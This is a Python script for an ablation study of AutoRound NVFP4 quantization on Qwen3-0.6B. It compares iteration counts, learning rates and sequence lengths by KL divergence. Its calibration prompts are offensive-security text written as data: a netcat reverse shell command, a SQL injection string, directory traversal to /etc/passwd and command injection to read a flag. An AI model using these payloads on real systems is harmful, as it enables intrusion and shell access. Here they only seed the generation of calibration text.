"""
AutoRound Ablation Study — true NVFP4 edition (data_type="nv_fp4").

Parameters varied (one at a time):
  ITERS  — sign-grad optimization steps  (analogous to QAD steps)
  LR     — sign-grad learning rate       (replaces group_size axis)
  SEQLEN — calibration sequence length

Fixed by NVFP4 spec (auto_round enforces these for nv_fp4):
  bits       = 4  (E2M1 float)
  group_size = 16 (per-block FP8 scale, NVFP4 micro-block)

The old bits=2/3 experiments don't apply (NVFP4 is fixed at 4-bit).
The old group_size sweep doesn't apply either (NVFP4 fixes block=16).
LR replaces group_size as the third axis since auto_round exposes it as a tunable.

RTN baseline is shared across all experiments (group_size and bits are fixed).
"""

import time
import torch
import torch.nn.functional as F
from transformers import AutoTokenizer, AutoModelForCausalLM
from auto_round import AutoRound

# ── CONFIG ────────────────────────────────────────────────────────────────────

MODEL_NAME     = "Qwen/Qwen3-0.6B"
DEVICE         = "cuda" if torch.cuda.is_available() else "cpu"
MAX_NEW_TOKENS = 80
TEMPERATURE    = 2.0
BITS           = 4    # fixed: FP4 E2M1
GROUP_SIZE     = 16   # fixed: NVFP4 spec (auto_round enforces this for nv_fp4)

PROMPTS = [
    "You are a security agent. The target is http://10.0.0.5. Goal: retrieve the flag.",
    "nmap -sV 10.0.0.5 reveals port 80 open. The next step is",
    "curl -s http://10.0.0.5/ shows a ping form. This is a classic",
    "Command injection confirmed: uid=0(root). Reading the flag with",
    "The flag is located at /root/flag.txt. To retrieve it via command injection:",
    "SQL injection payload: ' OR 1=1 --. The response from the server was",
    "Directory traversal: ../../../../etc/passwd. The file contains",
    "Netcat reverse shell: nc -e /bin/bash 10.0.0.1 4444. Connection established.",
]

# ── EXPERIMENTS ───────────────────────────────────────────────────────────────

EXPERIMENTS = [
    # --- baseline ---
    {"name": "baseline",              "iters": 200, "lr": None,  "seqlen":  64},

    # --- vary ITERS (analogous to QAD steps) ---
    {"name": "iters_50",              "iters":  50, "lr": None,  "seqlen":  64},
    {"name": "iters_100",             "iters": 100, "lr": None,  "seqlen":  64},
    {"name": "iters_500",             "iters": 500, "lr": None,  "seqlen":  64},

    # --- vary LR (replaces group_size; auto_round default lr ≈ 1.0/iters when None) ---
    {"name": "lr_5e-3 (slow)",        "iters": 200, "lr": 5e-3,  "seqlen":  64},
    {"name": "lr_1e-2",               "iters": 200, "lr": 1e-2,  "seqlen":  64},
    {"name": "lr_5e-2 (fast)",        "iters": 200, "lr": 5e-2,  "seqlen":  64},

    # --- vary SEQLEN ---
    {"name": "seqlen_32 (short)",     "iters": 200, "lr": None,  "seqlen":  32},
    {"name": "seqlen_128 (long)",     "iters": 200, "lr": None,  "seqlen": 128},

    # --- combined ---
    {"name": "iters_500+seqlen_128",  "iters": 500, "lr": None,  "seqlen": 128},
    {"name": "iters_500+lr_5e-3",     "iters": 500, "lr": 5e-3,  "seqlen":  64},
]

# ── MODEL UTILITIES ───────────────────────────────────────────────────────────

print(f"Device: {DEVICE}  |  Model: {MODEL_NAME}\n")
tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME)
if tokenizer.pad_token is None:
    tokenizer.pad_token = tokenizer.eos_token


def load_teacher() -> torch.nn.Module:
    model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )
    model.eval()
    for p in model.parameters():
        p.requires_grad = False
    return model


def load_bf16() -> torch.nn.Module:
    return AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, dtype=torch.bfloat16, device_map=DEVICE,
    )


# ── CORE FUNCTIONS ────────────────────────────────────────────────────────────

def generate_calibration_data(teacher, prompts, max_new_tokens):
    print("Generating calibration data...")
    sequences = []
    for i, prompt in enumerate(prompts):
        ids = tokenizer.encode(prompt, return_tensors="pt").to(DEVICE)
        with torch.no_grad():
            out = teacher.generate(
                ids, max_new_tokens=max_new_tokens,
                do_sample=True, temperature=0.7,
                pad_token_id=tokenizer.pad_token_id,
            )
        sequences.append(out)
        print(f"  [{i+1}/{len(prompts)}] {out.shape[1]} tokens")
    return sequences


def measure_kl(model_a, model_b, data, temperature):
    model_a.eval()
    model_b.eval()
    total = 0.0
    with torch.no_grad():
        for seq in data:
            la = model_a(input_ids=seq).logits.clamp(-100, 100)
            lb = model_b(input_ids=seq).logits.clamp(-100, 100)
            kl = F.kl_div(
                F.log_softmax(lb / temperature, dim=-1),
                F.softmax(la  / temperature, dim=-1),
                reduction="batchmean",
            ) * (temperature ** 2)
            total += kl.item()
    return total / len(data)


def run_autoround(model, iters, lr, seqlen, cal_texts):
    kwargs = dict(
        model=model,
        tokenizer=tokenizer,
        bits=BITS,
        group_size=GROUP_SIZE,   # locked at 16 for NVFP4
        iters=iters,
        dataset=cal_texts,
        seqlen=seqlen,
        data_type="nv_fp4",
        device_map=DEVICE,
    )
    if lr is not None:
        kwargs["lr"] = lr
    autoround = AutoRound(**kwargs)
    autoround.quantize()
    model.to(DEVICE)


# ── MAIN ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":

    print("=== Loading Teacher ===")
    teacher = load_teacher()

    print("\n=== Generating Calibration Data (used for ALL experiments) ===")
    calibration_data = generate_calibration_data(teacher, PROMPTS, MAX_NEW_TOKENS)
    cal_texts = [
        tokenizer.decode(seq[0], skip_special_tokens=True)
        for seq in calibration_data
    ]

    kl_oracle = measure_kl(teacher, teacher, calibration_data, TEMPERATURE)
    print(f"\n  Oracle KL (BF16 vs BF16) : {kl_oracle:.4f}  ← should be ~0\n")

    # ── RTN baselines — one per unique seqlen (bits, group_size are fixed) ───
    print("=== Computing RTN Baselines (per seqlen) ===")
    rtn_seqlens = {cfg["seqlen"] for cfg in EXPERIMENTS}
    rtn_kl: dict[int, float] = {}

    for seqlen in sorted(rtn_seqlens):
        print(f"  RTN baseline: seqlen={seqlen}")
        rtn_model = load_bf16()
        run_autoround(rtn_model, iters=0, lr=None, seqlen=seqlen, cal_texts=cal_texts)
        kl = measure_kl(teacher, rtn_model, calibration_data, TEMPERATURE)
        rtn_kl[seqlen] = kl
        print(f"    KL = {kl:.4f}")
        del rtn_model
        torch.cuda.empty_cache()

    # ── Run all experiments ───────────────────────────────────────────────────
    results = []

    for i, cfg in enumerate(EXPERIMENTS):
        name   = cfg["name"]
        iters  = cfg["iters"]
        lr     = cfg["lr"]
        seqlen = cfg["seqlen"]

        kl_rtn    = rtn_kl[seqlen]
        total_gap = kl_rtn - kl_oracle

        print(f"\n[{i+1}/{len(EXPERIMENTS)}] {name}  "
              f"iters={iters}  lr={lr}  seqlen={seqlen}  "
              f"RTN_KL={kl_rtn:.4f}")

        model = load_bf16()

        t0 = time.perf_counter()
        run_autoround(model, iters=iters, lr=lr, seqlen=seqlen, cal_texts=cal_texts)
        elapsed = time.perf_counter() - t0

        kl_post   = measure_kl(teacher, model, calibration_data, TEMPERATURE)
        recovered = kl_rtn - kl_post
        pct       = recovered / total_gap * 100 if total_gap > 0 else 0.0

        results.append({
            "name":      name,
            "iters":     iters,
            "lr":        lr,
            "seqlen":    seqlen,
            "kl_rtn":    kl_rtn,
            "kl_post":   kl_post,
            "recovered": recovered,
            "pct":       pct,
            "elapsed":   elapsed,
        })
        print(f"  post-AR KL: {kl_post:.4f}  recovered: {pct:.1f}%  time: {elapsed:.1f}s")

        del model
        torch.cuda.empty_cache()

    # ── Final comparison table ─────────────────────────────────────────────────
    print("\n" + "=" * 90)
    print("RESULTS SUMMARY  (bits=4  group_size=16  data_type=nv_fp4)")
    print("=" * 90)
    print(f"  Oracle KL  : {kl_oracle:.4f}  (target)")
    print()
    print(f"  {'Experiment':<26} {'Iters':>6} {'LR':>8} {'SeqLen':>7} "
          f"{'RTN KL':>8} {'Post KL':>8} {'% Recovered':>12} {'Time(s)':>9}")
    print("  " + "-" * 88)

    for r in sorted(results, key=lambda x: x["pct"], reverse=True):
        lr_str = "auto" if r["lr"] is None else f"{r['lr']:.0e}"
        print(f"  {r['name']:<26} {r['iters']:>6} {lr_str:>8} {r['seqlen']:>7} "
              f"  {r['kl_rtn']:>6.4f}   {r['kl_post']:>6.4f}   {r['pct']:>9.1f}%"
              f"  {r['elapsed']:>7.1f}s")

    print("\n" + "=" * 90)
    print("NOTE: % recovered is relative to each config's own RTN baseline (per seqlen).")
    print("      bits=4 and group_size=16 are fixed by the NVFP4 spec.")